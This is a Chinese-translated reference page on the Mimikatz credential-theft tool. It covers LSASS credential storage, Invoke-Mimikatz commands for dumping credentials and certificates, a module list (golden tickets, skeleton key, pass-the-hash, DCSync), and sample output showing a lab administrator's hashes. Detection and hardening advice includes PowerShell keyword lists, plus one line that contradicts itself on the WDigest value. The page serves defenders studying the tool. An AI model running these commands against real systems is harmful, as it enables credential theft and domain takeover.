<h4 id="Mimikatz作者："><a href="#Mimikatz作者：" class="headerlink" title="Mimikatz作者："></a><strong>Mimikatz作者：</strong></h4><ul>
<li>Benjamin DELPY <code>gentilkiwi</code>，你可以在推特上联系他（@gentilkiwi）或者通过邮件联系他（benjamin [at] gentilkiwi.com）</li>
<li><code>lsadump</code>模块中的DCSync功能与Vincent LE TOUX共同编写，您通过邮件联系他（vincent.letoux [at] gmail.com）或访问他的网站（<a href="http://www.mysmartlogon.com/" target="_blank" rel="noopener">http://www.mysmartlogon.com</a>）</li>
</ul>
<h4 id="“官方”Mimikatz链接："><a href="#“官方”Mimikatz链接：" class="headerlink" title="“官方”Mimikatz链接："></a><strong>“官方”Mimikatz链接：</strong></h4><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz GitHub位置</a>（源代码）</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz发布</a>（包括二进制文件）</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="noopener">Mimikatz GitHub Wiki</a>（文档，其中一些在此处转载）</p>
<p><a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="noopener">GentilKiwi Blog</a>（大部分是法语，使用Chrome / other进行翻译）</p>
<h3 id="Mimikatz＆Credentials："><a href="#Mimikatz＆Credentials：" class="headerlink" title="Mimikatz＆Credentials："></a><strong>Mimikatz＆Credentials：</strong></h3><p>​    用户登录后，会生成各种凭据并将其存储在内存中的本地安全机构子系统服务<a href="http://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" target="_blank" rel="noopener">LSASS</a>中。这是为了便于单点登录（SSO），确保每次请求资源访问时都不会提示用户。凭证数据可能包括Kerberos票证，NTLM密码哈希值，LM密码哈希值（如果密码&lt;15个字符，具体取决于Windows操作系统版本和补丁级别），甚至是明文密码（以支持WDigest和SSP身份验证等）。</p>
<p>​    虽然可以<a href="http://support.microsoft.com/kb/299656" target="_blank" rel="noopener">阻止Windows计算机</a>在本地计算机SAM数据库（和AD数据库）中<a href="http://support.microsoft.com/kb/299656" target="_blank" rel="noopener">创建LM哈希</a>，但这不会阻止系统在内存中生成LM哈希。<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">默认情况下，</a>除非明确启用，否则<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">Windows Server 2008和Windows Vista不再</a>为用户<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">生成LM哈希值</a>。从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再在内存中。<a href="https://adsecurity.org/?p=559" target="_blank" rel="noopener">此功能也在kb2871997中“反向移植”到早期版本的Windows（Windows 7/8 / 2008R2 / 2012）</a>，但为了防止将“明文”密码放入LSASS，以下注册表项需要设置为“0”（摘要已禁用）：</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" alt="WDIGEST-的RegistryKey-UseLogonCredential-1"></a></p>
<p>此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为1以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2。Windows 8.1 / 2012 R2及更新版本没有“UseLogonCredential”DWORD值，因此必须创建它。在这些系统上存在此密钥可能表明存在问题。</p>
<p>请注意，攻击者很少需要直接在目标系统上运行代码，因此Mimikatz会不断更新，以便远程运行新功能。这包括远程系统对远程系统运行Mimikatz以转储凭据，使用PowerShell远程处理远程使用<strong>Invoke-Mimikatz</strong>，以及<a href="https://adsecurity.org/?page_id=1821#DCSync" target="_blank" rel="noopener">DCSync</a>，这是在没有运行任何Mimikatz代码的情况下远程访问域中任何Active Directory帐户的密码数据的最新功能在DC（<a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">它使用Microsoft的域控制器官方复制API，一旦获得正确的权限</a>）。</p>
<h3 id="OS提供的可用凭据："><a href="#OS提供的可用凭据：" class="headerlink" title="OS提供的可用凭据："></a><strong>OS提供的可用凭据：</strong></h3><p>Benjamin Delpy在OneDrive上发布了一个Excel图表（不再可用，但如下所示），显示内存中可用的凭证数据类型（LSASS），包括Windows 8.1和Windows 2012 R2，它们具有增强的保护机制，减少了数量和类型凭证保存在内存中。<em>（点击图片来embiggen）</em></p>
<p><img src="http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png" alt=""></p>
<h3 id="PowerShell和Mimikatz："><a href="#PowerShell和Mimikatz：" class="headerlink" title="PowerShell和Mimikatz："></a><strong>PowerShell和Mimikatz：</strong></h3><p>大多数Mimikatz功能都可以在<a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>（PowerShell Post-Exploitation Framework）中通过“ <a href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">Invoke-Mimikatz</a>”PowerShell脚本（由<a href="https://twitter.com/JosephBialek" target="_blank" rel="noopener">Joseph Bialek</a>编写）获得，脚本“leverages Mimikatz 2.0和Invoke-ReflectivePEInjection反射性地将Mimikatz完全加载到内存中。这允许您在不将Mimikatz二进制文件写入磁盘的情况下执行诸如转储凭证之类的操作。“请注意，PowerSploit框架现在托管在<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">”PowerShellMafia“GitHub存储库中</a>。</p>
<p>Invoke-Mimikatz的“神奇”之处在于能够将Mimikatz DLL（嵌入在脚本中）反射加载到内存中。Invoke-Mimikatz代码可以从Internet（或Intranet服务器）下载，并且可以从内存中执行而无需接触任何磁盘。此外，如果使用适当的权限运行Invoke-Mimikatz并且目标计算机启用了PowerShell远程处理，它可以从其他系统提取凭据，以及远程执行标准Mimikatz命令，而不会在远程系统上删除文件。</p>
<p>当Mimikatz出现时，Invoke-Mimikatz不会更新，尽管它可以（手动）。可以用新的DLL编码元素（32位和64位版本）替换掉。Will Schroeder（<a href="https://twitter.com/harmj0y" target="_blank" rel="noopener">@ HarmJ0y）</a>有<a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/" target="_blank" rel="noopener">关于在Invoke-Mimikatz中更新Mimikatz DLL的信息</a>（这不是一个非常复杂的过程）。该<a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">调用-Mimikatz的PowerShell的帝国版本</a>通常保持最新。</p>
<ul>
<li>使用mimikatz从LSASS转储凭证：  <em>Invoke-Mimikatz -DumpCreds</em></li>
<li>使用mimikatz导出所有私有证书（即使它们被标记为不可导出）：<em>Invoke-Mimikatz -</em> DumpCerts</li>
<li>提升权限以在远程计算机上拥有debug权限：<em>Invoke-Mimikatz -Command“privilege::debug exit”-ComputerName“computer1”</em></li>
</ul>
<p>Invoke-Mimikatz“Command”参数使Invoke-Mimikatz能够运行自定义Mimikatz命令。</p>
<p>​        </p>
<h3 id="检测Mimikatz："><a href="#检测Mimikatz：" class="headerlink" title="检测Mimikatz："></a><strong>检测Mimikatz：</strong></h3><p>有几种方法可以在网络上检测Mimikatz的使用，但没有一种方法可以保证。由于Mimikatz的源代码在<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">GitHub上</a>，任何使用Visual Studio的人都可以编译自己的版本。我用“kitikatz”替换了所有“mimikatz”的实例，建立了我自己的Mimikatz版本，名为“kitikatz”，而VirusTotal的检测率并不好（4/54）。我的Windows 10系统上的Windows Defender检测到它。然后我用相同的单词替换了“Benjamin Delpy”和“gentilkiwi”，只用3代替e和i代替。检出率<a href="https://www.virustotal.com/en/file/84b6cd8ccaa60a89c1375bec5044e6240d8a2db3f19fecd763749fa9a530470b/analysis/1449967355/" target="_blank" rel="noopener">仍然很差（4/54）</a>。我的Windows 10系统上的Windows Defender没有检测到它。因此，您的里程数会因检测而异。虽然<a href="http://blog.virustotal.com/2012/08/av-comparative-analyses-marketing-and.html" target="_blank" rel="noopener">VirusTotal不是确定AV检测的最佳方法</a>，获得一些基本数字是一种相对简单的方法。</p>
<ul>
<li>Benjamin Delpy 在<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimkatz GitHub存储库</a>上发布了Mimikatz的<a href="https://plusvic.github.io/yara/" target="_blank" rel="noopener">YARA规则</a>。</li>
<li>使用最新的定义文件运行AntiVirus软件。据<a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">VirusTotal称</a>，<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">35/35的AV引擎</a>检测到<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">日期为11/11/2015</a>（32位和64位）的<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">mimikatz.exe</a>。重命名文件不会更改扫描结果。请注意，本杰明已经注意到现实世界的结果<a href="https://twitter.com/gentilkiwi/status/658344484615421954" target="_blank" rel="noopener">不太成功</a>。但是，AV通常会标记已知的坏文件。AntiVirus是基础安全的一部分 - “深度防御”的第一层。</li>
<li>Mimikatz（截至10月）<a href="http://blog.cobaltstrike.com/2015/11/11/revolutionary-device-detects-mimikatz-use/" target="_blank" rel="noopener">激活附属的BusyLights</a>。<em>[在Mimikatz版本2.0 alpha 20151008（oe.eo）版本中实施]</em></li>
<li>利用安全软件识别与LSASS交互的进程。监控过程注入的安全软件也可以定期检测Mimikatz的使用情况。</li>
<li><a href="https://isc.sans.edu/diary/Detecting+Mimikatz+Use+On+Your+Network/19311" target="_blank" rel="noopener">HoneyTokens / HoneyHashes</a>涉及在企业中的许多计算机<a href="https://isc.sans.edu/diary/Detecting+Mimikatz+Use+On+Your+Network/19311" target="_blank" rel="noopener">上将</a>特殊凭证存储在内存中。标记了这些凭据，因此当有人尝试使用它们时，会发出严重警报。这需要某种推送方法以及放置对攻击者有吸引力的凭据。从理论上讲，这可以检测证书被盗和在环境中的使用。</li>
<li>如果企业中的WDIGEST注册表项（HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ SecurityProviders \ WDigest）应设置为“0”，以防止“明文”密码存储在LSASS中，并且系统中存在切换到“1”，这可能表示凭证盗窃活动。此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为0以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2（可能还有2016年）。</li>
<li><a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">我在2015年初发布的此页面上介绍了伪造的Kerberos票证检测。这些方法可以检测金票，银票和信任票</a>。我还有关于<a href="https://adsecurity.org/?p=763" target="_blank" rel="noopener">如何检测MS14-068 Kerberos漏洞利用的信息</a>。</li>
<li>在支持它的企业中的所有Windows版本上启用LSA Protection。这可以防止Mimikatz“开箱即用”，并且需要使用Mimikatz驱动程序，该驱动程序在与LSASS交互时记录事件。</li>
<li><a href="https://technet.microsoft.com/en-us/library/mt431757%28v=vs.85%29.aspx" target="_blank" rel="noopener">从Windows 10和Windows Server 2016开始</a>有<a href="https://technet.microsoft.com/en-us/library/mt431757%28v=vs.85%29.aspx" target="_blank" rel="noopener">新的/更新的事件</a>，可能会检测到Mimikatz的使用：</li>
</ul>
<blockquote>
<p><strong>向LSASS.exe添加了默认进程SACL</strong><br>在Windows 10中，将一个默认进程SACL添加到LSASS.exe以记录尝试访问LSASS.exe的进程。SACL是L“S :( AU; SAFA; 0x0010 ;;; WD）”。您可以在高级审核策略配置\对象访问\审核内核对象下启用此功能。<br>这有助于识别从进程内存中窃取凭据的攻击。</p>
</blockquote>
<h4 id="Mimikatz＆LSA保护："><a href="#Mimikatz＆LSA保护：" class="headerlink" title="Mimikatz＆LSA保护："></a>Mimikatz＆LSA保护：</h4><p>Windows Server 2012 R2和Windows 8.1包含一项名为LSA Protection的新功能，该功能涉及<a href="https://technet.microsoft.com/en-us/library/dn408187.aspx" target="_blank" rel="noopener">在Windows Server 2012 R2上</a>启用<a href="https://technet.microsoft.com/en-us/library/dn408187.aspx" target="_blank" rel="noopener">LSASS作为受保护进程</a>（Mimikatz可以绕过驱动程序，但这会在事件日志中产生一些噪音）：</p>
<p><em>LSA（包括本地安全机构服务器服务（LSASS）进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。这为LSA存储和管理的凭据提供了额外的安全性。</em></p>
<p>启用LSA保护：</p>
<ol>
<li>打开注册表编辑器（RegEdit.exe），然后导航到位于以下位置的注册表项：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa  并将注册表项的值设置为：“RunAsPPL”=dword:00000001。</li>
<li>创建新GPO并浏览到“计算机配置”，“首选项”，“Windows设置”。右键单击“注册表”，指向“新建”，然后单击“注册表项”。将出现“新建注册表属性”对话框。在Hive列表中，单击HKEY_LOCAL_MACHINE。在“密钥路径”列表中，浏览到SYSTEM\CurrentControlSet\Control\Lsa.。在“值名称”框中，键入RunAsPPL。在“值类型”框中，单击“REG_DWORD”。在“数值数据”框中，键入00000001.单击“确定”。</li>
</ol>
<p>LSA Protection可防止未受保护的进程与LSASS交互。Mimikatz仍然可以通过驱动程序（“！+”）绕过它。</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" alt="Mimikatz驱动器 - 删除 -  LSASS保护"></a></p>
<h3 id="检测Invoke-Mimikatz："><a href="#检测Invoke-Mimikatz：" class="headerlink" title="检测Invoke-Mimikatz："></a><strong>检测Invoke-Mimikatz：</strong></h3><ul>
<li>确保所有Windows系统都具有PowerShell v3或更高版本。较新版本的PowerShell具有更好的日志记录功能，尤其是PowerShell v5。</li>
<li>通过组策略启用PowerShell模块日志记录：计算机配置，策略，管理模板，Windows组件和Windows PowerShell，打开模块日志记录。输入“*”并单击“确定”。这将记录所有PowerShell活动，包括所有PowerShell模块。</li>
</ul>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" alt="PowerShellModuleLogging，所有"></a></p>
<ul>
<li>PowerShell活动将记录到PowerShell操作日志中。将这些事件推送或拉到中央日志记录服务器（通过<a href="http://blogs.technet.com/b/wincat/archive/2008/08/11/quick-and-dirty-large-scale-eventing-for-windows.aspx" target="_blank" rel="noopener">Windows事件转发或类似方法</a>）或SIEM。</li>
<li>解析以下内容的PowerShell事件：<ul>
<li>“System.Reflection.AssemblyName”</li>
<li>“System.Reflection.Emit.AssemblyBuilderAccess”</li>
<li>“System.Runtime.InteropServices.MarshalAsAttribute”</li>
<li>“TOKEN_PRIVILEGES”</li>
<li>“SE_PRIVILEGE_ENABLED”</li>
</ul>
</li>
</ul>
<p><em>注意：虽然可以通过警告“mimikatz”，“Delpy”或“gentilkiwi”来识别Mimikatz的使用情况，但“复杂”的攻击者可能会在没有这些关键字的情况下推出他们自己的Mimikatz或Invoke-Mimikatz版本。</em></p>
<h4 id="检测攻击性PowerShell工具："><a href="#检测攻击性PowerShell工具：" class="headerlink" title="检测攻击性PowerShell工具："></a>检测攻击性PowerShell工具：</h4><p>许多PowerShell攻击性工具使用以下在PowerShell模块日志记录中记录的调用。</p>
<ul>
<li>“GetDelegateForFunctionPointer”</li>
<li>“System.Reflection.AssemblyName”</li>
<li>“System.Reflection.Emit.AssemblyBuilderAccess”</li>
<li>“System.Management.Automation.WindowsErrorReporting”</li>
<li>“MiniDumpWriteDump”</li>
<li>“TOKEN_IMPERSONATE”</li>
<li>“TOKEN_DUPLICATE”</li>
<li>“TOKEN_ADJUST_PRIVILEGES”</li>
<li>“TOKEN_PRIVILEGES”</li>
</ul>
<h3 id="“Sneaky”的Mimikatz执行："><a href="#“Sneaky”的Mimikatz执行：" class="headerlink" title="“Sneaky”的Mimikatz执行："></a><strong>“</strong>Sneaky<strong>”的Mimikatz执行：</strong></h3><p>凯西·史密斯（<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@subtee</a>＆<a href="http://subt0x10.blogspot.com/" target="_blank" rel="noopener">blog</a>）已经做了很多工作，展示了<a href="http://subt0x10.blogspot.com/2015/11/your-whitelisting-application-has-no.html" target="_blank" rel="noopener">应用程序白名单不是许多人认为的灵丹妙药</a>。尽管如此，应用程序白名单是深度防御战略中的一个坚实层面。<br>凯西还提出了许多创造性和偷偷摸摸的方式来执行Mimikatz。</p>
<ul>
<li>在RegSvcs或RegAsm内部执行Mimikatz - .NET实用程序概念验证</li>
<li><a href="http://subt0x10.blogspot.com/2015/09/simple-example-of-encoded-mimikatz-upx.html" target="_blank" rel="noopener">Mimikatz打包并隐藏在图像文件中</a></li>
<li>从GitHub下载并执行Mimikatz In Memory</li>
</ul>
<p>注意：Subtee已经停止使用他的GitHub仓库，因此这些链接不再有效并且已被删除。</p>
<h3 id="最受欢迎的Mimikatz命令："><a href="#最受欢迎的Mimikatz命令：" class="headerlink" title="最受欢迎的Mimikatz命令："></a><strong>最受欢迎的Mimikatz命令：</strong></h3><p>以下是一些最受欢迎的Mimikatz命令和相关功能。</p>
<ul>
<li><a href="https://adsecurity.org/?page_id=1821#CRYPTOCertificates" target="_blank" rel="noopener">CRYPTO::Certificates</a> - 列出/出口证书</li>
<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSGolden" target="_blank" rel="noopener">KERBEROS::Golden</a> - 制作金/银/信托票（ golden/silver/trust tickets）</li>
<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSList" target="_blank" rel="noopener">KERBEROS::List</a> - 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。</li>
<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSPTT" target="_blank" rel="noopener">KERBEROS::PTT</a> - 通过门票。通常用于注入被盗或伪造的Kerberos票（金/银/信托）。</li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPDCSync" target="_blank" rel="noopener">LSADUMP::DCSync</a> - 要求DC同步对象（获取帐户的密码数据）。无需在DC上运行代码。</li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPLSA" target="_blank" rel="noopener">LSADUMP::LSA</a> - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。用于从域控制器或lsass.dmp转储文件转储所有Active Directory域凭据。还用于获取特定的帐户凭据，例如krbtgt和参数/ name：“/ name：krbtgt”</li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPSAM" target="_blank" rel="noopener">LSADUMP::SAM</a> - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。这用于转储Windows计算机上的所有本地凭据。</li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPTrust" target="_blank" rel="noopener">LSADUMP::Trust</a> - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。转储所有关联信任（域/林）的信任密钥（密码）。</li>
<li><a href="https://adsecurity.org/?page_id=1821#MISCAddSid" target="_blank" rel="noopener">MISC::AddSid</a> - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。已移至SID：自2016年5月6日起修改。</li>
<li><a href="https://adsecurity.org/?page_id=1821#MISCMemSSP" target="_blank" rel="noopener">MISC::MemSSP</a> - 注入恶意Windows SSP以记录本地经过身份验证的凭据。</li>
<li><a href="https://adsecurity.org/?page_id=1821#MISCSkeleton" target="_blank" rel="noopener">MISC::Skeleton</a> - 在域控制器上将Skeleton Key注入LSASS进程。这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。</li>
<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGEDebug" target="_blank" rel="noopener">PRIVILEGE::Debug</a> - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAEkeys" target="_blank" rel="noopener">SEKURLSA::Ekeys</a> - 列出Kerberos加密密钥</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKerberos" target="_blank" rel="noopener">SEKURLSA::Kerberos</a> - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKrbtgt" target="_blank" rel="noopener">SEKURLSA::Krbtgt</a> - 获取Domain Kerberos服务帐户（KRBTGT）密码数据</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords" target="_blank" rel="noopener">SEKURLSA::LogonPasswords</a> - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAPth" target="_blank" rel="noopener">SEKURLSA::Pth</a> - Pass- theHash和Over-the-the-Hash</li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSATickets" target="_blank" rel="noopener">SEKURLSA::Tickets</a> - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。</li>
<li><a href="https://adsecurity.org/?page_id=1821#TOKENList" target="_blank" rel="noopener">TOKEN::List</a> - 列出系统的所有令牌</li>
<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate</a> - 模拟令牌。用于将权限提升为SYSTEM（默认）或在框中查找域管理员令牌</li>
<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate / domainadmin</a> - 使用域管理员凭据模拟令牌。</li>
</ul>
<h3 id="ADSecurity-Mimikatz帖子："><a href="#ADSecurity-Mimikatz帖子：" class="headerlink" title="ADSecurity Mimikatz帖子："></a><strong>ADSecurity Mimikatz帖子：</strong></h3><p>所有帖子提到Mimikatz：<a href="https://adsecurity.org/?tag=mimikatz" target="_blank" rel="noopener">ADSecurity.org Mimikatz Posts</a></p>
<ul>
<li><a href="https://adsecurity.org/?p=556" target="_blank" rel="noopener">Mimikatz和Active Directory Kerberos攻击</a></li>
<li><a href="https://adsecurity.org/?p=2053" target="_blank" rel="noopener">使用Mimikatz DCSync转储域中所有管理员的明文密码</a></li>
<li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">攻击者如何使用Kerberos Silver Tickets来利用系统</a></li>
<li><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">Mimikatz DCSync使用，利用和检测</a></li>
<li><a href="https://adsecurity.org/?p=1760" target="_blank" rel="noopener">偷偷摸摸的Active Directory持久性＃12：恶意安全支持提供程序（SSP）</a></li>
<li><a href="https://adsecurity.org/?p=1714" target="_blank" rel="noopener">偷偷摸摸的Active Directory持久性＃11：目录服务还原模式（DSRM）</a></li>
<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">Kerberos金票现在更加黄金</a></li>
<li><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">全是关于信任 - 在Active Directory信任中伪造Keroos信任票到欺骗访问</a></li>
<li><a href="https://adsecurity.org/?p=1567" target="_blank" rel="noopener">检测Mimikatz使用</a></li>
</ul>
<h3 id="Mimikatz指南："><a href="#Mimikatz指南：" class="headerlink" title="Mimikatz指南："></a><strong>Mimikatz指南：</strong></h3><p>Mimikatz可以通过简单地运行“Mimikatz.exe”或传递命令并退出（例如：’ <em>Mimikatz“kerberos::list”exit’</em>）以交互模式执行。Invoke-Mimikatz没有交互模式。</p>
<p>Mimikatz可用于将命令从命令行传递到Mimikatz以按顺序处理，这对于Invoke-Mimikatz或在脚本中使用Mimikatz非常有用。执行完最后一个命令后，追加“退出”退出Mimikatz（这样做，所以Mimikatz优雅地退出）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp\mimikatz&gt;.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"> ## / \ ##  /* * *</span><br><span class="line"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> &apos;## v ##&apos;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line"> &apos;#####&apos;                                     with 17 modules * * */</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line"> Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uthentication Id : 0 ; 646260 (00000000:0009dc74)</span><br><span class="line"> Session           : RemoteInteractive from 2</span><br><span class="line"> User Name         : adsadministrator</span><br><span class="line"> Domain            : ADSECLAB</span><br><span class="line"> Logon Server      : ADSDC03</span><br><span class="line"> Logon Time        : 11/27/2015 11:41:27 AM</span><br><span class="line"> SID               : S-1-5-21-1581655573-3923512380-696647894-500</span><br><span class="line"> msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> [00010000] CredentialKeys</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> tspkg :</span><br><span class="line"> wdigest :</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * Password : (null)</span><br><span class="line"> kerberos :</span><br><span class="line"> * Username : adsadministrator</span><br><span class="line"> * Domain   : LAB.ADSECURITY.ORG</span><br><span class="line"> * Password : (null)</span><br><span class="line"> ssp :   KO</span><br></pre></td></tr></table></figure>
<p>交互模式提供“Mimikatz控制台”，可以在其中实时输入和执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp\mimikatz&gt; .\mimikatz</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.#####.   mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"> ## / \ ##  /* * *</span><br><span class="line"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> &apos;## v ##&apos;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line"> &apos;#####&apos;                                     with 17 modules * * */</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line"> Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
